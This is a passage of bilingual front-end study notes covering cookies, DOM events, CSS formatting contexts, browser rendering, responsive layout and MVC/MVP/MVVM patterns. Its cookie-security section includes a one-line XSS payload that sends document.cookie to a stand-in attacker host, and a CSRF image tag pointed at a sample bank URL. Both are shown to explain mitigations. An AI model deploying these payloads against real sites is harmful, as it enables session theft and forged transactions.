     function (sKey, sPath, sDomain) {
         if (!this.hasItem(sKey)) { return false; }
         document.cookie = encodeURIComponent(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT" + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "");
         return true;
     }
     ```

1. cookie security
   - Session hijacking and XSS
     - Cookies are often used in web application to identify a user and their authenticated session
     - stealing a cookie can lead to hijacking the authenticated user's session
     - The `HttpOnly` cookie attribute can help to mitigate this attack
     - exploiting an XSS vulnerability in the application
       ```javascript
       (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
       ```

   - Cross-site request forgery (CSRF)
     - prevent
       - As with XSS, input filtering is important
       - There should always be a confirmation required for any sensitive action
       - Cookies that are used for sensitive actions should have a short lifetime only
       - For more prevention tips, see the [OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)
     - for example, someone includes an image that isn’t really an image (for example in an unfiltered chat or forum), instead it really is a request to your bank’s server to withdraw money. Now, if you are logged into your bank account and your cookies are still valid (and there is no other validation), you will transfer money as soon as you load the HTML that contains this image
       ```html
       <img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
       ```

   - Tracking and privacy
     - third-party cookies are mainly used for advertising and tracking across the web
     - Do-Not-Track: `DNT` request header, but not effective
     - persistent cookie: [evercookie](https://github.com/samyk/evercookie)
   - space and number restrictions on cookies???

## DOM

1. 事件委托
   - 当一个父节点下的多个子节点绑定相同的事件时，可以利用事件冒泡机制，将事件委托给父元素执行，这时候只需要绑定一个事件便可以触发子元素的事件。
   - 优点：1.只需注册一个事件，节省了大量的内存2.可以实现当新增（或删去）子对象时无需再次对其绑定（或解绑）事件。尤其是对于动态部分的内容，比如AJAX，不需要对新增的元素进行绑定以及对删除的元素解除绑定
   - 缺点：1.事件委托是基于事件冒泡机制来说的，如果不支持事件冒泡则不能进行事件委托2.如果层级过多，冒泡过程中，很可能被某层阻断

# CSS

1. display:none,visibility:hidden,opacity:0
   1. 父元素为visibility:hidden，而子元素可以设置为visibility:visible并且生效
   1. 和display:none一样无法获得焦点
   1. 可在冒泡阶段响应事件
   1. 和display:none 一样不妨碍form表单的提交
   1. CSS中的 counter不会忽略
   1. Transition 对visibility的变化有效
   1. visibility 变化不会触发reflow
   1. opacity=0只是透明度为100%,元素隐藏，依然占据空间, visibility也占据空间。
   1. opacity=0会被子元素继承,且，子元素并不能通过opacity=1，进行反隐藏。不能。
   1. opacity=0的元素依然能触发已经绑定的事件。
   1. opacity,transition对她有效(毫无争议)

1. BFC 即 Block Formatting Contexts (块级格式化上下文) — contains everything inside of the element creating it
   - The rules for positioning and clearing of floats apply only to things within the same block formatting context
   - Margin collapsing also occurs only between blocks that belong to the same block formatting context.
   - 阻止元素被浮动元素覆盖(但是文本信息不会被浮动元素所覆盖)：触发被覆盖元素的BFC
   - create BFC
     - the root element or something that contains it
     - floats (elements where float is not none)
     - absolutely positioned elements (elements where position is absolute or fixed)
     - flex items (direct children of the element with display: flex or inline-flex)
     - grid items (direct children of the element with display: grid or inline-grid)
     - block elements where overflow has a value other than visible
     - tables
       - table cells (elements with display: table-cell, which is the default for HTML table cells)
       - table captions (elements with display: table-caption, which is the default for HTML table captions)
       - anonymous table cells implicitly created by the elements with display: table, table-row, table-row-group, table-header-group, table-footer-group (which is the default for HTML tables, table rows, table bodies, table headers and table footers, respectively), or inline-table
     - inline-blocks (elements with display: inline-block)
     - display: flow-root
     - elements with contain: layout, content, or strict
     - multicol containers (elements where column-count or column-width is not auto, including elements with column-count: 1)
     - column-span: all should always create a new formatting context, even when the column-span: all element isn't contained by a multicol container

1. IFC — Inline Formatting Contexts
   - create IFC — 一个块级元素中仅包含内联级别元素
   - Vertical padding and borders will be applied but may overlap content above and below
   - 应用场景
     - 水平居中：当一个块要在环境中水平居中时，设置其为 inline-block 则会在外层产生 IFC，通过设置父容器 text-align:center 则可以使其水平居中。
     - 垂直居中：创建一个IFC，用其中一个元素撑开父元素的高度，然后设置其 vertical-align:middle，其他行内元素则可以在此父元素下垂直居中。

1. browser rendering
   - steps
     1. 解析HTML，生成DOM树，解析CSS，生成CSSOM树
     1. 将DOM 树和CSSOM树结合，生成渲染树(Render Tree)，只包含可见节点（`display: none`）
     1. Layout(回流):根据生成的渲染树，进行回流(Layout)，得到节点的几何信息（viewport内的位置，大小）
     1. Painting(重绘):根据渲染树以及回流得到的几何信息，得到节点的绝对像素
     1. Display:将像素发送给GPU，展示在页面上。（这一步其实还有很多内容，比如会在GPU将多个合成层合并为同一个层，并展示在页面中。而css3硬件加速的原理则是新建合成层）
   - 何时发生回流重绘，页面布局和几何信息发生变化的时候，回流一定会触发重绘，而重绘不一定会回流
     - 添加或删除可见的DOM元素
     - 元素的位置发生变化
     - 元素的尺寸发生变化（包括外边距、内边框、边框大小、高度和宽度等）
     - 内容发生变化，比如文本变化或图片被另一个不同尺寸的图片所替代。
     - 页面一开始渲染的时候（这肯定避免不了）
     - 浏览器的窗口尺寸变化（因为回流是根据视口的大小来计算元素的位置和大小的）
   - 浏览器的优化机制
     - 通过队列化修改并批量执行来优化重排过程
     - 获取布局信息的操作的时候，会强制队列刷新，触发回流重绘
       - `offsetTop`, `scrollTop`, `clientTop` 等等
       - [list](https://gist.github.com/paulirish/5d52fb081b3570c81e3a)
   - 减少重绘重排
     - `cssText`
       ```JavaScript
       const el = document.getElementById('test');
       el.style.cssText += 'border-left: 1px; border-right: 2px; padding: 5px;';
       ```
     - 修改CSS的 class
     - 缓存`offsetTop`等值
     - 避免使用`table`布局
     - 对于复杂动画效果,使用绝对定位让其脱离文档流
     - 尽可能在DOM树的最末端改变class，回流是不可避免的，但可以减少其影响。尽可能在DOM树的最末端改变class，可以限制了回流的范围，使其影响尽可能少的节点。
     - 避免写过于具体的 CSS 选择器，然后对于 HTML 来说也尽量少的添加无意义标签，保证层级扁平。
     - 批量修改DOM：脱离——修改——放回
       - 隐藏元素
       - `document.createDocumentFragment()`
       - `Node.cloneNode(true)`
     - css3硬件加速（GPU加速）
       - transform
       - opacity
       - filters
       - Will-change

1. vertical centering
   - [Generator](http://howtocenterincss.com/)
   - use CSS table, flexbox, grid
   - natural height container — apply an equal top and bottom padding to the container
   - fixed height container or avoid padding — `display: table-cell` and `vertical-align: middle`
   - one line text — set a tall line height equal to the desired container height
     - If the contents aren’t inline, you may have to set them to `inline-block`
   - height known — absolute positioning

1. 横屏竖屏，移动端适配
   - 基本设置
     ```html
     <meta name="viewport" content="width=device-width,initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
     ```
   - 判断横屏竖屏
     ```CSS
     @media screen and (orientation: portrait) {
       /*竖屏 css*/
     }
     @media screen and (orientation: landscape) {
       /*横屏 css*/
     }
     ```
     ```html
     <link rel="stylesheet" media="all and (orientation:portrait)" href="portrait.css">
     <link rel="stylesheet" media="all and (orientation:landscape)" href="landscape.css">
     ```
   - JS 判断横屏竖屏
     ```javascript
     //判断手机横竖屏状态：
     window.addEventListener("onorientationchange" in window ? "orientationchange" : "resize", function() {
             if (window.orientation === 180 || window.orientation === 0) {
                 alert('竖屏状态！');
             }
             if (window.orientation === 90 || window.orientation === -90 ){
                 alert('横屏状态！');
             }  
         }, false);
     //移动端的浏览器一般都支持window.orientation这个参数，通过这个参数可以判断出手机是处在横屏还是竖屏状态。
     ```

1. 响应式布局
   - static — px
   - liquid — `width: ?%`, scaling the width of parts of the design relative to the window with `max-*`, `min-*`
   - 弹性布局 — 包裹文字的各元素的尺寸采用em做单位，而页面的主要划分区域的尺寸仍使用百分数或px做单位（同「流式布局」或「固定布局」）
     - 使用了rem单位的弹性布局在移动端也很受欢迎
     - 使用vw、vh等后起之秀的单位，可以实现完美的流式布局（高度和文字大小都可以变得“流式”），弹性布局就不再必要了。
   - adaptive — `@media` with static-like, having defined layouts for different resolutions
   - responsive — `@media` with liquid-like

# MV*

1. GUI 应用程序
   - 把管理用户界面的层次称为View
   - 应用程序的数据为Model（注意这里的Model指的是Domain Model，这个应用程序对需要解决的问题的数据抽象，不包含应用的状态，可以简单理解为对象）
   - Model提供数据操作的接口，执行相应的业务逻辑。
   - MV* — View如何同步Model的变更，View和Model之间如何粘合在一起。

1. small-talk 80 MVC  
   ![][p2]

   [p2]: ./images/2.png
   - View是把控制权交移给Controller，Controller执行应用程序相关的应用逻辑（对来自View数据进行预处理、决定调用哪个Model的接口等等）。
   - Controller操作Model，Model执行业务逻辑对数据进行处理。但不会直接操作View，可以说它是对View无知的。
   - View和Model的同步消息是通过观察者模式进行，而同步操作是由View自己请求Model的数据然后对视图进行更新。
   - 精髓在于第三点：Model的更新是通过观察者模式告知View的，具体表现形式可以是Pub/Sub或者是触发Events。而网上很多对于MVC的描述都没有强调这一点。通过观察者模式的好处就是：不同的MVC三角关系可能会有共同的Model，一个MVC三角中的Controller操作了Model以后，两个MVC三角的View都会接受到通知，然后更新自己。保持了依赖同一块Model的不同View显示数据的实时性和准确性。
   - 优点：
     - 把业务逻辑和展示逻辑分离，模块化程度高。且当应用逻辑需要变更的时候，不需要变更业务逻辑和展示逻辑，只需要Controller换成另外一个Controller就行了（Swappable Controller）。
     - 观察者模式可以做到多视图同时更新。
   - 缺点：
     - Controller测试困难。因为视图同步操作是由View自己执行，而View只能在有UI的环境下运行。在没有UI环境下对Controller进行单元测试的时候，应用逻辑正确性是无法验证的：Model更新的时候，无法对View的更新操作进行断言。
     - View无法组件化。View是强依赖特定的Model的，如果需要把这个View抽出来作为一个另外一个应用程序可复用的组件就困难了。因为不同程序的的Domain Model是不一样的

1. MVC Model 2 (JSP Model 2)
   - 服务端接收到来自客户端的请求，服务端通过路由规则把这个请求交由给特定的Controller进行处理，Controller执行相应的应用逻辑，对Model进行操作，Model执行业务逻辑以后；然后用数据去渲染特定的模版，返回给客户端。
   - 经典的Smalltalk-80 MVC中Model通过观察者模式告知View更新这一环被无情地打破

1. MVP  
   ![][p3]

   [p3]: ./images/3.png
   - 和MVC模式一样，用户对View的操作都会从View交移给Presenter。Presenter会执行相应的应用程序逻辑，并且对Model进行相应的操作；而这时候Model执行完业务逻辑以后，也是通过观察者模式把自己变更的消息传递出去，**但是是传给Presenter而不是View**。Presenter获取到Model变更的消息以后，通过View提供的接口更新界面。
   - 关键点：
     - View不再负责同步的逻辑，而是由Presenter负责。Presenter中既有应用程序逻辑也有同步逻辑。
     - View需要提供操作界面的接口给Presenter进行调用。（关键）
   - 优点：
     - 便于测试。Presenter对View是通过接口进行，在对Presenter进行不依赖UI环境的单元测试的时候。可以通过Mock一个View对象，这个对象只需要实现了View的接口即可。然后依赖注入到Presenter中，单元测试的时候就可以完整的测试Presenter应用逻辑的正确性。这里根据上面的例子给出了Presenter的单元测试样例。
     - View可以进行组件化。在MVP当中，View不依赖Model。这样就可以让View从特定的业务场景中脱离出来，可以说View可以做到对业务完全无知。它只需要提供一系列接口提供给上层操作。这样就可以做到高度可复用的View组件。
   - 缺点：
     - Presenter中除了应用逻辑以外，还有大量的View->Model，Model->View的手动同步逻辑，造成Presenter比较笨重，维护起来会比较困难。

1. MVVM — 可以看作是一种特殊的MVP（Passive View）模式，或者说是对MVP模式的一种改良。
   - ViewModel的含义就是 "Model of View"，视图的模型。它的含义包含了领域模型（Domain Model）和视图的状态（State）
     - 在图形界面应用程序当中，界面所提供的信息可能不仅仅包含应用程序的领域模型。还可能包含一些领域模型不包含的视图状态，例如电子表格程序上需要显示当前排序的状态是顺序的还是逆序的，而这是Domain Model所不包含的，但也是需要显示的信息。
   - MVVM的调用关系
     - MVVM的调用关系和MVP一样。
     - 但是，在ViewModel当中会有一个叫Binder，或者是Data-binding engine的东西。以前全部由Presenter负责的View和Model之间数据同步操作交由给Binder处理。
     - 你只需要在View的模版语法当中，指令式地声明View上的显示的内容是和Model的哪一块数据绑定的。当ViewModel对进行Model更新的时候，Binder会自动把数据更新到View上去，当用户对View进行操作（例如表单输入），Binder也会自动把数据更新到Model上去。这种方式称为：Two-way data-binding，双向数据绑定。
   - 优点：
     - 提高可维护性。解决了MVP大量的手动View和Model同步的问题，提供双向绑定机制。提高了代码的可维护性。
     - 简化测试。因为同步逻辑是交由Binder做的，View跟着Model同时变更，所以只需要保证Model的正确性，View就正确。大大减少了对View同步更新的测试。
   - 缺点：
     - 过于简单的图形界面不适用，或说牛刀杀鸡。
     - 对于大型的图形应用程序，视图状态较多，ViewModel的构建和维护的成本都会比较高。
     - 数据绑定的声明是指令式地写在View的模版当中的，这些内容是没办法去打断点debug的。

1. virtual DOM
   1. 用 JavaScript 对象结构表示 DOM 树的结构；然后用这个树构建一个真正的 DOM 树，插到文档当中
   1. 当状态变更的时候，重新构造一棵新的对象树。然后用新的树和旧的树进行比较，记录两棵树差异
   1. 把2所记录的差异应用到步骤1所构建的真正的DOM树上，视图就更新了

1. vue 的双向绑定 — `Proxy`类，劫持get, set

1. angular — 代理异步操作，而数据的变化是且仅可能是由于异步事件而产生的

# Node

1. 多线程
   - `child_process`, `cluster`
   - `worker_threads`
     - 干CPU密集型的工作

1. event loop

# Other

1. 输入URL按下回车后
   - [blog](http://blog.jobbole.com/84870/)
   - [en version](https://github.com/alex/what-happens-when)

1. SSR
   - [zhihu](https://zhuanlan.zhihu.com/p/47044039)

1. fiber
   - [zhihu](https://zhuanlan.zhihu.com/p/40160380), also other posts of the author
   - [github](https://github.com/acdlite/react-fiber-architecture)

1. diff — [zhihu](https://zhuanlan.zhihu.com/p/20346379)

1. `setState` — [github](https://github.com/sisterAn/blog/issues/26)

1. garbage collection — [blog](https://segmentfault.com/a/1190000000440270)

1. 为什么通常在发送数据埋点请求的时候使用的是 1x1 像素的透明 gif 图片 — [github](https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/87)

1. Redux — [zhihu](https://www.zhihu.com/search?q=redux%20%E5%8E%9F%E7%90%86&type=content)
